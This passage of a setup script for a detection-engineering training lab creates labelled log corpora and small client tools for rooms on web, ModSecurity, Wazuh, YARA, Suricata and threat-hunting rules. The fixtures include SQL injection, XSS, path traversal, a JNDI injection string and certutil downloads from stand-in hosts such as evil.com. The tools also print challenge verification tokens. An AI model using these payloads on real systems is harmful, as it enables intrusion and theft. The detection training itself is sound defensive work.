    if res.get("status") == "POWERSHELL_DETECTION_VALIDATED":
        print("\n[+] Verification Token: POWERSHELL_DETECTION_VALIDATED")
else:
    print("Usage: powershell_obfuscation_tool.py [--show-telemetry | --emulate-detection | --tune-regex | --challenge]")
EOF
chmod +x /home/operator/tools/powershell_obfuscation_tool.py

# ============================================================================
# DETECTION ENGINEERING ROOM 09: WRITING WEB APPLICATION DETECTION RULES
# ============================================================================
cat << 'EOF' > /var/log/detection/web_application_logs.json
[
  {
    "client_ip": "203.0.113.42",
    "method": "GET",
    "uri": "/search.php?q=test%27%20UNION%20SELECT%20null,username,password%20FROM%20users--",
    "status_code": 200,
    "user_agent": "sqlmap/1.6#stable",
    "label": "ATTACK_SQLI_UNION"
  },
  {
    "client_ip": "198.51.100.15",
    "method": "POST",
    "uri": "/comments.php",
    "status_code": 200,
    "body": "comment=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E",
    "user_agent": "Mozilla/5.0",
    "label": "ATTACK_XSS_STORED"
  },
  {
    "client_ip": "198.51.100.88",
    "method": "GET",
    "uri": "/view.php?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "status_code": 200,
    "user_agent": "curl/7.68.0",
    "label": "ATTACK_PATH_TRAVERSAL_LFI"
  },
  {
    "client_ip": "10.0.0.50",
    "method": "GET",
    "uri": "/index.php?category=electronics&page=1",
    "status_code": 200,
    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "label": "BENIGN_USER_BROWSE"
  }
]
EOF
chmod 644 /var/log/detection/web_application_logs.json

cat << 'EOF' > /home/operator/tools/web_detection_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8409
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    headers = {"Content-Type": "application/json"}
    sess = os.getenv("SESSION_ID")
    op = os.getenv("OPERATOR_ID")
    if sess:
        headers["X-Session-ID"] = sess
    if op:
        headers["X-Operator-ID"] = op
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers=headers
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-telemetry" in args:
    with open("/var/log/detection/web_application_logs.json") as f:
        print(f.read())
elif "--emulate-detection" in args or "--emulate" in args:
    payload = {
        "event_source": "nginx-access-log",
        "action": "EVALUATE_WEB_DETECTION_RULES"
    }
    res = http_post("/api/detection-web-rules/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "WEB_DETECTION_VERIFIED":
        print("\n[+] Verification Token: WEB_DETECTION_VERIFIED")
elif "--tune-urldecode" in args:
    payload = {
        "filter": "URL_DECODE_NORMALIZATION"
    }
    res = http_post("/api/detection-web-rules/tune-urldecode", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_WEB_DETECTION"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "WEB_DETECTION_VALIDATED":
        print("\n[+] Verification Token: WEB_DETECTION_VALIDATED")
else:
    print("Usage: web_detection_tool.py [--show-telemetry | --emulate-detection | --tune-urldecode | --challenge]")
EOF
chmod +x /home/operator/tools/web_detection_tool.py

# ============================================================================
# DETECTION ENGINEERING ROOM 10: MODSECURITY CORE RULE SET TUNING
# ============================================================================
cat << 'EOF' > /var/log/detection/modsecurity_audit_events.json
[
  {
    "transaction_id": "W4o5K8AaBbCcDdEeFf",
    "client_ip": "198.51.100.77",
    "rule_id": 942100,
    "msg": "SQL Injection Attack Detected via libinjection",
    "anomaly_score": 5,
    "paranoia_level": 1,
    "label": "ATTACK_SQLI_LIBINJECTION"
  },
  {
    "transaction_id": "W4o5K9GgHhIiJjKkLl",
    "client_ip": "10.0.0.12",
    "rule_id": 920272,
    "msg": "Multiple URL Encoding Detected",
    "anomaly_score": 3,
    "paranoia_level": 2,
    "label": "BENIGN_FALSE_POSITIVE_ENCODING"
  },
  {
    "transaction_id": "W4o5L0MmNnOoPpQqRr",
    "client_ip": "203.0.113.19",
    "rule_id": 932100,
    "msg": "Remote Command Execution: Unix Shell Command Found",
    "anomaly_score": 5,
    "paranoia_level": 1,
    "label": "ATTACK_RCE_UNIX_SHELL"
  }
]
EOF
chmod 644 /var/log/detection/modsecurity_audit_events.json

cat << 'EOF' > /home/operator/tools/modsec_tuning_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8410
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    headers = {"Content-Type": "application/json"}
    sess = os.getenv("SESSION_ID")
    op = os.getenv("OPERATOR_ID")
    if sess:
        headers["X-Session-ID"] = sess
    if op:
        headers["X-Operator-ID"] = op
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers=headers
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-telemetry" in args:
    with open("/var/log/detection/modsecurity_audit_events.json") as f:
        print(f.read())
elif "--emulate-detection" in args or "--emulate" in args:
    payload = {
        "rule_id": 942100,
        "action": "EVALUATE_MODSEC_RULES"
    }
    res = http_post("/api/detection-modsec/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "MODSEC_CRS_VERIFIED":
        print("\n[+] Verification Token: MODSEC_CRS_VERIFIED")
elif "--tune-paranoia" in args:
    payload = {
        "paranoia_level": 2,
        "rule_exclusion": "REQUEST-920-PROTOCOL-ENFORCEMENT"
    }
    res = http_post("/api/detection-modsec/tune-paranoia", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_MODSEC_CRS"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "MODSEC_CRS_VALIDATED":
        print("\n[+] Verification Token: MODSEC_CRS_VALIDATED")
else:
    print("Usage: modsec_tuning_tool.py [--show-telemetry | --emulate-detection | --tune-paranoia | --challenge]")
EOF
chmod +x /home/operator/tools/modsec_tuning_tool.py

# ============================================================================
# DETECTION ENGINEERING ROOM 11: WAZUH / OSSEC RULES & DECODERS
# ============================================================================
cat << 'EOF' > /var/log/detection/wazuh_log_corpus.json
[
  {
    "timestamp": "2026-11-15T12:00:01Z",
    "program_name": "custom_authd",
    "log": "custom_authd[4412]: AUTH_FAILURE user=operator src_ip=198.51.100.22 reason=BAD_PASSWORD",
    "label": "ATTACK_FAILED_AUTH"
  },
  {
    "timestamp": "2026-11-15T12:00:03Z",
    "program_name": "custom_authd",
    "log": "custom_authd[4412]: AUTH_FAILURE user=operator src_ip=198.51.100.22 reason=BAD_PASSWORD",
    "label": "ATTACK_BRUTEFORCE_BURST"
  },
  {
    "timestamp": "2026-11-15T12:00:15Z",
    "program_name": "custom_authd",
    "log": "custom_authd[4415]: AUTH_SUCCESS user=operator src_ip=198.51.100.22 session=sess_9941",
    "label": "ATTACK_SUCCESS_AFTER_BURST"
  },
  {
    "timestamp": "2026-11-15T12:05:00Z",
    "program_name": "custom_authd",
    "log": "custom_authd[4420]: HEALTH_CHECK status=OK latency=2ms",
    "label": "BENIGN_DAEMON_PROBE"
  }
]
EOF
chmod 644 /var/log/detection/wazuh_log_corpus.json

cat << 'EOF' > /home/operator/tools/wazuh_decoders_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8411
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    headers = {"Content-Type": "application/json"}
    sess = os.getenv("SESSION_ID")
    op = os.getenv("OPERATOR_ID")
    if sess:
        headers["X-Session-ID"] = sess
    if op:
        headers["X-Operator-ID"] = op
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers=headers
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-telemetry" in args:
    with open("/var/log/detection/wazuh_log_corpus.json") as f:
        print(f.read())
elif "--emulate-detection" in args or "--emulate" in args:
    payload = {
        "decoder_name": "custom_authd_decoder",
        "action": "EVALUATE_WAZUH_RULES"
    }
    res = http_post("/api/detection-wazuh/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "WAZUH_RULES_VERIFIED":
        print("\n[+] Verification Token: WAZUH_RULES_VERIFIED")
elif "--tune-decoder" in args:
    payload = {
        "regex": "custom_authd\\[\\d+\\]: (\\w+) user=(\\w+) src_ip=(\\S+) (.*)"
    }
    res = http_post("/api/detection-wazuh/tune-decoder", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_WAZUH_RULES"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "WAZUH_RULES_VALIDATED":
        print("\n[+] Verification Token: WAZUH_RULES_VALIDATED")
else:
    print("Usage: wazuh_decoders_tool.py [--show-telemetry | --emulate-detection | --tune-decoder | --challenge]")
EOF
chmod +x /home/operator/tools/wazuh_decoders_tool.py

# ============================================================================
# DETECTION ENGINEERING ROOM 12: TUNING DETECTIONS & REDUCING FALSE POSITIVES
# ============================================================================
cat << 'EOF' > /var/log/detection/tuning_baseline_telemetry.json
[
  {
    "event_id": 1,
    "process_name": "powershell.exe",
    "command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\BackupNightly.ps1",
    "user": "NT AUTHORITY\\SYSTEM",
    "parent_process": "taskeng.exe",
    "label": "BENIGN_SCHEDULED_BACKUP"
  },
  {
    "event_id": 1,
    "process_name": "powershell.exe",
    "command_line": "powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgAIAA...",
    "user": "CORP\\chethan",
    "parent_process": "winword.exe",
    "label": "ATTACK_MALICIOUS_OFFICE_SPAWN"
  },
  {
    "event_id": 1,
    "process_name": "cmd.exe",
    "command_line": "cmd.exe /c whoami /priv",
    "user": "CORP\\devuser",
    "parent_process": "vscode.exe",
    "label": "BENIGN_DEVELOPER_QUERY"
  },
  {
    "event_id": 1,
    "process_name": "certutil.exe",
    "command_line": "certutil.exe -urlcache -split -f http://198.51.100.4/beacon.bin C:\\temp\\b.bin",
    "user": "CORP\\victim1",
    "parent_process": "explorer.exe",
    "label": "ATTACK_CERTUTIL_DOWNLOAD"
  }
]
EOF
chmod 644 /var/log/detection/tuning_baseline_telemetry.json

cat << 'EOF' > /home/operator/tools/false_positive_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8412
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    headers = {"Content-Type": "application/json"}
    sess = os.getenv("SESSION_ID")
    op = os.getenv("OPERATOR_ID")
    if sess:
        headers["X-Session-ID"] = sess
    if op:
        headers["X-Operator-ID"] = op
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers=headers
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-telemetry" in args:
    with open("/var/log/detection/tuning_baseline_telemetry.json") as f:
        print(f.read())
elif "--emulate-detection" in args or "--emulate" in args:
    payload = {
        "action": "EVALUATE_FALSE_POSITIVE_METRICS"
    }
    res = http_post("/api/detection-false-positive/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "FALSE_POSITIVE_TUNING_VERIFIED":
        print("\n[+] Verification Token: FALSE_POSITIVE_TUNING_VERIFIED")
elif "--tune-baseline" in args:
    payload = {
        "exclusion": "WHITELIST_BACKUP_SERVICE_ACCOUNT"
    }
    res = http_post("/api/detection-false-positive/tune-baseline", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_FALSE_POSITIVE_TUNING"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "FALSE_POSITIVE_TUNING_VALIDATED":
        print("\n[+] Verification Token: FALSE_POSITIVE_TUNING_VALIDATED")
else:
    print("Usage: false_positive_tool.py [--show-telemetry | --emulate-detection | --tune-baseline | --challenge]")
EOF
chmod +x /home/operator/tools/false_positive_tool.py

# 37. Initialize Detection Room 13: Baseline Profiling & Threshold-Based Detections Assets
cat << 'EOF' > /var/log/detection/threshold_baseline_events.json
[
  {
    "timestamp": "2026-11-15T10:00:00Z",
    "user": "svc_sql",
    "src_ip": "10.0.1.15",
    "auth_status": "SUCCESS",
    "hourly_mean": 2.1,
    "window_count": 2,
    "label": "BENIGN_SERVICE_ACCOUNT_AUTH"
  },
  {
    "timestamp": "2026-11-15T10:05:00Z",
    "user": "admin",
    "src_ip": "192.168.1.100",
    "auth_status": "FAILURE",
    "hourly_mean": 1.4,
    "window_count": 1,
    "label": "BENIGN_USER_TYPO"
  },
  {
    "timestamp": "2026-11-15T10:08:00Z",
    "user": "finance01",
    "src_ip": "10.0.2.45",
    "auth_status": "FAILURE",
    "hourly_mean": 1.2,
    "window_count": 87,
    "anomaly_flag": "THRESHOLD_EXCEEDED",
    "z_score": 6.8,
    "mitre_technique": "T1110.003",
    "label": "ATTACK_PASSWORD_SPRAY_SPIKE"
  },
  {
    "timestamp": "2026-11-15T10:12:00Z",
    "user": "devops_lead",
    "src_ip": "10.0.3.12",
    "auth_status": "SUCCESS",
    "hourly_mean": 4.5,
    "window_count": 5,
    "label": "BENIGN_DEVELOPER_AUTH"
  }
]
EOF
chmod 644 /var/log/detection/threshold_baseline_events.json

cat << 'EOF' > /home/operator/tools/threshold_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8413
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    headers = {"Content-Type": "application/json"}
    sess = os.getenv("SESSION_ID")
    op = os.getenv("OPERATOR_ID")
    if sess:
        headers["X-Session-ID"] = sess
    if op:
        headers["X-Operator-ID"] = op
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers=headers
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-events" in args:
    with open("/var/log/detection/threshold_baseline_events.json") as f:
        print(f.read())
elif "--emulate-detection" in args or "--emulate" in args:
    payload = {
        "action": "EVALUATE_THRESHOLD_BASELINE"
    }
    res = http_post("/api/detection-threshold/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "THRESHOLD_DETECTION_VERIFIED":
        print("\n[+] Verification Token: THRESHOLD_DETECTION_VERIFIED")
elif "--tune-window" in args:
    payload = {
        "window_seconds": 300,
        "threshold": 50
    }
    res = http_post("/api/detection-threshold/tune-window", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_THRESHOLD_DETECTION"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "THRESHOLD_DETECTION_VALIDATED":
        print("\n[+] Verification Token: THRESHOLD_DETECTION_VALIDATED")
else:
    print("Usage: threshold_tool.py [--show-events | --emulate-detection | --tune-window | --challenge]")
EOF
chmod +x /home/operator/tools/threshold_tool.py

# 38. Initialize Detection Room 14: Correlation Rules: Multi-Event Detection Assets
cat << 'EOF' > /var/log/detection/multi_event_correlation_stream.json
[
  {
    "stage": 1,
    "telemetry": "email_gateway",
    "event": "phishing_attachment_delivered",
    "recipient": "victim@corp.local",
    "filename": "Invoice_Q3.docm",
    "host": "WS-0941",
    "timestamp": "2026-11-15T11:00:10Z",
    "mitre_technique": "T1566.001",
    "label": "ATTACK_SPEARPHISHING_ATTACHMENT"
  },
  {
    "stage": 2,
    "telemetry": "edr_sysmon_1",
    "event": "process_creation",
    "process": "powershell.exe",
    "parent_process": "winword.exe",
    "command_line": "powershell.exe -ep bypass -nop -w hidden -enc JABjAGwAaQ...",
    "host": "WS-0941",
    "timestamp": "2026-11-15T11:00:45Z",
    "mitre_technique": "T1059.001",
    "label": "ATTACK_MACRO_EXECUTION"
  },
  {
    "stage": 3,
    "telemetry": "network_zeek",
    "event": "outbound_connection",
    "dest_ip": "198.51.100.89",
    "dest_port": 4444,
    "host": "WS-0941",
    "timestamp": "2026-11-15T11:01:05Z",
    "mitre_technique": "T1071.001",
    "label": "ATTACK_C2_BEACON"
  }
]
EOF
chmod 644 /var/log/detection/multi_event_correlation_stream.json

cat << 'EOF' > /home/operator/tools/correlation_rule_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8414
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    headers = {"Content-Type": "application/json"}
    sess = os.getenv("SESSION_ID")
    op = os.getenv("OPERATOR_ID")
    if sess:
        headers["X-Session-ID"] = sess
    if op:
        headers["X-Operator-ID"] = op
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers=headers
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-events" in args:
    with open("/var/log/detection/multi_event_correlation_stream.json") as f:
        print(f.read())
elif "--emulate-correlation" in args or "--emulate" in args:
    payload = {
        "action": "EVALUATE_CORRELATION_CHAIN"
    }
    res = http_post("/api/detection-correlation/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "CORRELATION_RULE_VERIFIED":
        print("\n[+] Verification Token: CORRELATION_RULE_VERIFIED")
elif "--tune-sequence" in args:
    payload = {
        "join_key": "host.name",
        "max_span": 600
    }
    res = http_post("/api/detection-correlation/tune-sequence", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_CORRELATION_RULE"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "CORRELATION_RULE_VALIDATED":
        print("\n[+] Verification Token: CORRELATION_RULE_VALIDATED")
else:
    print("Usage: correlation_rule_tool.py [--show-events | --emulate-correlation | --tune-sequence | --challenge]")
EOF
chmod +x /home/operator/tools/correlation_rule_tool.py

# 39. Initialize Detection Room 15: Detection Testing with Unit Tests & Synthetic Logs Assets
cat << 'EOF' > /var/log/detection/synthetic_test_fixtures.json
[
  {
    "id": "FIX-POS-01",
    "type": "positive",
    "description": "Obfuscated PowerShell invocation from Office document",
    "log": {
      "event_id": 1,
      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "command_line": "powershell.exe -enc SQBFAFgA...",
      "parent_image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\winword.exe"
    },
    "expected_result": "MATCH"
  },
  {
    "id": "FIX-POS-02",
    "type": "positive",
    "description": "LOLBIN Certutil web file transfer",
    "log": {
      "event_id": 1,
      "image": "C:\\Windows\\System32\\certutil.exe",
      "command_line": "certutil.exe -urlcache -split -f http://evil.com/x.exe C:\\temp\\x.exe"
    },
    "expected_result": "MATCH"
  },
  {
    "id": "FIX-NEG-01",
    "type": "negative",
    "description": "Legitimate developer git command line",
    "log": {
      "event_id": 1,
      "image": "C:\\Program Files\\Git\\bin\\git.exe",
      "command_line": "git.exe status",
      "parent_image": "C:\\Windows\\explorer.exe"
    },
    "expected_result": "NO_MATCH"
  },
  {
    "id": "FIX-NEG-02",
    "type": "negative",
    "description": "Legitimate maintenance command prompt",
    "log": {
      "event_id": 1,
      "image": "C:\\Windows\\System32\\cmd.exe",
      "command_line": "cmd.exe /c echo hello",
      "parent_image": "C:\\Windows\\System32\\services.exe"
    },
    "expected_result": "NO_MATCH"
  }
]
EOF
chmod 644 /var/log/detection/synthetic_test_fixtures.json

cat << 'EOF' > /home/operator/tools/detection_testing_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8415
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    headers = {"Content-Type": "application/json"}
    sess = os.getenv("SESSION_ID")
    op = os.getenv("OPERATOR_ID")
    if sess:
        headers["X-Session-ID"] = sess
    if op:
        headers["X-Operator-ID"] = op
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers=headers
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-fixtures" in args:
    with open("/var/log/detection/synthetic_test_fixtures.json") as f:
        print(f.read())
elif "--run-tests" in args or "--emulate" in args:
    payload = {
        "action": "EXECUTE_TEST_SUITE"
    }
    res = http_post("/api/detection-testing-rules/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "DETECTION_UNIT_TEST_VERIFIED":
        print("\n[+] Verification Token: DETECTION_UNIT_TEST_VERIFIED")
elif "--tune-fixtures" in args:
    payload = {
        "coverage": "COMPREHENSIVE"
    }
    res = http_post("/api/detection-testing-rules/tune-fixtures", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_DETECTION_UNIT_TEST"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "DETECTION_UNIT_TEST_VALIDATED":
        print("\n[+] Verification Token: DETECTION_UNIT_TEST_VALIDATED")
else:
    print("Usage: detection_testing_tool.py [--show-fixtures | --run-tests | --tune-fixtures | --challenge]")
EOF
chmod +x /home/operator/tools/detection_testing_tool.py

# 40. Initialize Detection Room 16: YARA Rules for File & Memory Threat Hunting Assets
cat << 'EOF' > /var/log/detection/yara_target_memory_samples.json
[
  {
    "pid": 3812,
    "process": "svchost.exe",
    "allocated_region": "0x00400000 - 0x00450000",
    "hex_preview": "4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00",
    "extracted_strings": [
      "VirtualAlloc",
      "WriteProcessMemory",
      "CreateRemoteThread",
      "cmd.exe /c echo beaconing"
    ],
    "section_entropy": 7.82,
    "classification": "SUSPICIOUS_REFLECTIVE_DLL",
    "label": "ATTACK_MEMORY_INJECTION"
  },
  {
    "pid": 1104,
    "process": "explorer.exe",
    "allocated_region": "0x7FF60000 - 0x7FF90000",
    "hex_preview": "4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00",
    "extracted_strings": [
      "ShellExecuteExW",
      "GetCommandLineW",
      "CreateWindowExW"
    ],
    "section_entropy": 5.12,
    "classification": "BENIGN_SYSTEM_PE",
    "label": "BENIGN_OS_BINARY"
  }
]
EOF
chmod 644 /var/log/detection/yara_target_memory_samples.json

cat << 'EOF' > /home/operator/tools/yara_hunting_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8416
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    headers = {"Content-Type": "application/json"}
    sess = os.getenv("SESSION_ID")
    op = os.getenv("OPERATOR_ID")
    if sess:
        headers["X-Session-ID"] = sess
    if op:
        headers["X-Operator-ID"] = op
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers=headers
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-samples" in args:
    with open("/var/log/detection/yara_target_memory_samples.json") as f:
        print(f.read())
elif "--scan-memory" in args or "--emulate" in args:
    payload = {
        "action": "EXECUTE_YARA_MEMORY_SCAN"
    }
    res = http_post("/api/detection-yara-hunting/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "YARA_HUNTING_VERIFIED":
        print("\n[+] Verification Token: YARA_HUNTING_VERIFIED")
elif "--tune-condition" in args:
    payload = {
        "condition": "uint16(0) == 0x5A4D"
    }
    res = http_post("/api/detection-yara-hunting/tune-condition", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_YARA_HUNTING"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "YARA_HUNTING_VALIDATED":
        print("\n[+] Verification Token: YARA_HUNTING_VALIDATED")
else:
    print("Usage: yara_hunting_tool.py [--show-samples | --scan-memory | --tune-condition | --challenge]")
EOF
chmod +x /home/operator/tools/yara_hunting_tool.py

# 41. Initialize Detection Room 17: Snort / Suricata Network Signatures Assets
cat << 'EOF' > /var/log/detection/suricata_network_events.json
[
  {
    "packet_id": 90141,
    "timestamp": "2026-11-15T13:00:01Z",
    "proto": "TCP",
    "src_ip": "192.168.1.105",
    "src_port": 49812,
    "dst_ip": "198.51.100.22",
    "dst_port": 80,
    "flow": "to_server,established",
    "http_uri": "/api/v1/auth",
    "payload_snippet": "POST /api/v1/auth HTTP/1.1\r\nUser-Agent: ${jndi:ldap://evil.internal/a}\r\n",
    "mitre_technique": "T1071.001",
    "label": "ATTACK_JNDI_INJECTION"
  },
  {
    "packet_id": 90142,
    "timestamp": "2026-11-15T13:00:05Z",
    "proto": "TCP",
    "src_ip": "10.0.1.12",
    "src_port": 50114,
    "dst_ip": "10.0.1.1",
    "dst_port": 443,
    "flow": "to_server,established",
    "http_uri": "/health",
    "payload_snippet": "GET /health HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n",
    "label": "BENIGN_INTERNAL_HEALTH_CHECK"
  }
]
EOF
chmod 644 /var/log/detection/suricata_network_events.json

cat << 'EOF' > /home/operator/tools/suricata_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8417
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    headers = {"Content-Type": "application/json"}
    sess = os.getenv("SESSION_ID")
    op = os.getenv("OPERATOR_ID")
    if sess:
        headers["X-Session-ID"] = sess
    if op:
        headers["X-Operator-ID"] = op
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers=headers
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-events" in args:
    with open("/var/log/detection/suricata_network_events.json") as f:
        print(f.read())
elif "--emulate-signature" in args or "--emulate" in args:
    payload = {
        "action": "EVALUATE_SURICATA_SIGNATURE"
    }
    res = http_post("/api/detection-suricata/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "SURICATA_SIGNATURE_VERIFIED":
        print("\n[+] Verification Token: SURICATA_SIGNATURE_VERIFIED")
elif "--tune-pcre" in args:
    payload = {
        "fast_pattern": "jndi"
    }
    res = http_post("/api/detection-suricata/tune-pcre", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_SURICATA_SIGNATURE"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "SURICATA_SIGNATURE_VALIDATED":
        print("\n[+] Verification Token: SURICATA_SIGNATURE_VALIDATED")
else:
    print("Usage: suricata_tool.py [--show-events | --emulate-signature | --tune-pcre | --challenge]")
EOF
chmod +x /home/operator/tools/suricata_tool.py

# 42. Initialize Detection Room 18: Threat Hunting Hypothesis Formulation Assets
cat << 'EOF' > /var/log/detection/threat_hunting_corpus.json
[
  {
    "event_id": 1,
    "timestamp": "2026-11-15T14:00:10Z",
    "process": "wmic.exe",
    "command_line": "wmic.exe /node:10.0.1.50 process call create 'powershell.exe -enc JABj...'",
    "parent_process": "cmd.exe",
    "user": "CORP\\compromised_admin",
    "host_count": 1,
    "mitre_technique": "T1047",
    "label": "ATTACK_REMOTE_WMI_EXECUTION"
  },
  {
    "event_id": 1,
    "timestamp": "2026-11-15T14:00:20Z",
    "process": "wmic.exe",
    "command_line": "wmic.exe OS get Caption,OSArchitecture",
    "parent_process": "SCCM_Client.exe",
    "user": "NT AUTHORITY\\SYSTEM",
    "host_count": 850,
    "label": "BENIGN_SCCM_INVENTORY_QUERY"
  }
]
EOF
chmod 644 /var/log/detection/threat_hunting_corpus.json

cat << 'EOF' > /home/operator/tools/threat_hunting_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8418
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
